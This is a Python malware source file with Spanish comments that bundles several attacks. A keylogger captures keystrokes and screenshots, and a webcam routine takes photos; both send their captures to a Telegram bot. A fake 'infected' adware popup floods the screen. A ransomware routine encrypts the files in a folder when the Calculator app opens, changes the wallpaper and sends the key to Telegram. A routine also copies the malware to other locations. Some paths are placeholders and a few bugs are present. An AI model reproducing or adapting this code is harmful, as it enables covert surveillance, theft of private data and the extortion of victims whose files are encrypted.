from pynput import keyboard
import pyautogui

import sys
import random, string
import telepot 
import time 
import shutil

texto=""
token = 'aquisu token' # telegram token 
receiver_id = 1270820713 # https://api.telegram.org/bot<TOKEN>/getUpdates 
bot = telepot.Bot(token) 



def keylogger():
    def on_press(key):
        global texto
    

        if key==keyboard.Key.enter:
            texto=texto+'\n'
            f=open('keyloguer.txt' , 'w')
            #debo agregar el txt a la carpeta
            f.writelines(texto)
            pyautogui.sleep(3)
            img=ramdon_string(7)
            pyautogui.screenshot('imagen'+ img +'.png') 
 
            bot.sendMessage(receiver_id, 'Captura tomada.') # envia mensaje al telegram 
            bot.sendPhoto(receiver_id, photo=open('imagen'+ img +'.png', 'rb')) # envia la foto al telegram  
            


        elif key == keyboard.Key.space:
            texto = texto+" "
        elif key == keyboard.Key.backspace:
            bot.sendMessage(receiver_id, 'Keylogger enviado.') # envia mensaje al telegram 
            bot.sendDocument(receiver_id, document=open('keyloguer.txt', 'rb')) # envia el keyloguer.txt al telegram  
            
        else:
            texto = texto+str(key)
            print(texto)

    #funcion que genera letras random evitando que varias imagenes se llamen igual
    def ramdon_string(length):
        letras=string.ascii_lowercase
        return ''.join(random.choice(letras)for i in range(length))  
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Función Adware, despliga 50 pantallas aleatoriamente por la pantalla, diciendo que ha sido infectado
def adware():
    import tkinter
    import random

    for i in range(50):
        window = tkinter.Tk()
        window.title("INFECTADO POR BLACKHAT")
        window.configure(bg='blue')
        window.overrideredirect(True) # Quitar barra de título
        window.resizable(False, False)

        label = tkinter.Label(window, text="USTED HA SIDO INFECTADO POR BLACKHAT", font=("Arial", 16), fg='white', bg='blue')
        label.pack(padx=30)
        label.pack(pady=20)

        x = random.randint(0, window.winfo_screenwidth())
        y = random.randint(0, window.winfo_screenheight())

        window.geometry("+{}+{}".format(x, y))

    window.mainloop()

# Funciones que se ejecutarán en la detección de teclas

def ctrlC():
    def pulsa_ctrl_c():
        print('Se ha pulsado <ctrl>+c')
        # Se llama el Adware
        adware()
    #definimos un diccionario con cada combinación de teclas y la función asociada
    hotkeys = { '<ctrl>+c': pulsa_ctrl_c }

    #finalmente lanzamos el escuchador con la clase GlobalHotKeys
    with keyboard.GlobalHotKeys(hotkeys) as escuchador:
        escuchador.join()

def ctrlV():
    import threading

    def pulsa_ctrl_v():
        print('Se ha pulsado <ctrl>+v')
        keyLogger = threading.Thread(target=keylogger)
        keyLogger.start()

    #definimos un diccionario con cada combinación de teclas y la función asociada
    hotkeys = { '<ctrl>+v': pulsa_ctrl_v }

    #finalmente lanzamos el escuchador con la clase GlobalHotKeys
    with keyboard.GlobalHotKeys(hotkeys) as escuchador:
        escuchador.join()

def ctrlX():
    def pulsa_ctrl_x():
            print('Se ha pulsado <ctrl>+x')
            # Se llama la función que toma foto de la cámara
            takePhoto()

    #definimos un diccionario con cada combinación de teclas y la función asociada
    hotkeys = { '<ctrl>+x': pulsa_ctrl_x }

    #finalmente lanzamos el escuchador con la clase GlobalHotKeys
    with keyboard.GlobalHotKeys(hotkeys) as escuchador:
        escuchador.join()

# Función que toma foto de la cámara
def takePhoto():
    import cv2
    import telepot 
    cap = cv2.VideoCapture(0)
    # Tomar una imagen
    ret, frame = cap.read()
    # Guardamos la imagen en un archivo
    cv2.imwrite('ruta del archivo', frame )
    #Liberamos la cámara
    cap.release()
    bot = telepot.Bot(token) 
    bot.sendMessage(receiver_id, 'Foto tomada.') # send a activation message to telegram receiver id  
    bot.sendPhoto(receiver_id, photo=open('Captura.png', 'rb')) # send message to telegram
    #cv2.imshow('Imagen', frame)

# Función que detecta cuando la Calculadora está abierta
def calcOpen():
    import wmi

    # Constructor de WMI
    f = wmi.WMI()
    executed = False
    while True:
        appear = 0
        # Bucle que itera todos los procesos de la PC.
        for process in f.Win32_Process():
            if ("CalculatorApp.exe" == process.Name):
                if (not executed):
                    executed = True
                    encriptar()
                    appear = 1
                break

        if (appear == 0):
            executed = False
        if (executed):
            break

# Función que Encripta los archivos de la carpeta elegida
def encriptar():
    from cryptography.fernet import Fernet
    import os

    def generar_key():
        key = Fernet.generate_key()
        with open('key.key', 'wb') as key_file:
            key_file.write(key)

    def cargar_key():
        return open('key.key', 'rb').read()

    def encrypt(items, key):
        f = Fernet(key)
        for item in items:
            with open(item, 'rb') as file:
                file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            with open(item, 'wb') as file:
                file.write(encrypted_data)

    if __name__ == '__main__':

        path_to_encrypt = 'ruta del encriptado'
        items = os.listdir(path_to_encrypt)
        full_path = [path_to_encrypt+'\\'+item for item in items]

        import ctypes
        PATH = "ruta imagen de fondo a intercambiar"
        ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH , 0)

        generar_key()
        key = cargar_key()

        encrypt(full_path, key)

        import telepot
        bot = telepot.Bot(token) 
        bot.sendDocument(receiver_id, document=open('key.key', 'rb')) # send message to telegram

        with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
            file.write('Ficheros encriptados por Every hats\n') 

# Función que Desencripta los archivos de la carpeta elegida
def desencriptar():
    from cryptography.fernet import Fernet
    import os

    def cargar_key():
        return open('key.key', 'rb').read()

    def decrypt(items, key):
        f = Fernet(key)
        for item in items:
            with open(item, 'rb') as file:
                encrypted_data = file.read()
            decrypted_data = f.decrypt(encrypted_data)
            with open(item, 'wb') as file:
                file.write(decrypted_data)

    if __name__ == '__main__':
        path_to_encrypt = 'ruta de la carpeta a Desencriptar'
        os.remove(path_to_encrypt+'\\'+'readme.txt')

        items = os.listdir(path_to_encrypt)
        full_path = [path_to_encrypt+'\\'+item for item in items]

        key = cargar_key()
        decrypt(full_path, key)

def delayTime():
    import time 
 
    # Obtener el tiempo actual en segundos 
    current_time = time.time() 
    
    # Calcular el tiempo en el futuro en el que se ejecutará el código (2 minutos a partir del tiempo actual) 
    future_time = current_time + 15 
    
    while True: 
        # Obtener el tiempo actual nuevamente 
        current_time = time.time() 
    
        # Verificar si el tiempo actual es igual o superior al tiempo futuro 
        if current_time >= future_time: 
            # Ejecutar el código aquí 
            shutil.copy('ruta del malware', 'ruta de donde deceas duplicarlo')
            shutil.copy('ruta de si generas un ejecutable', 'ruta de donde deceas duplicarlo')
            break 
        else: 
            time.sleep(1)



if __name__ == '__main__':
    import threading
    
    
    # Ejecutamos la Función que detecta las teclas en un Hilo diferente del programa
    keyCtrlC = threading.Thread(target=ctrlC)
    keyCtrlV = threading.Thread(target=ctrlV)
    keyCtrlX = threading.Thread(target=ctrlX)

    # Ejecutamos la Función que detecta si la calculadora está abierta en un Hilo diferente del programa
    calcSearchThread = threading.Thread(target=calcOpen)
    # ejecutamos la funcion de auto-copiado del malware 
    delayThread = threading.Thread(target=delayTime)
    
    keyCtrlC.start()
    keyCtrlV.start()
    keyCtrlX.start()
    calcSearchThread.start()
    delayThread.start()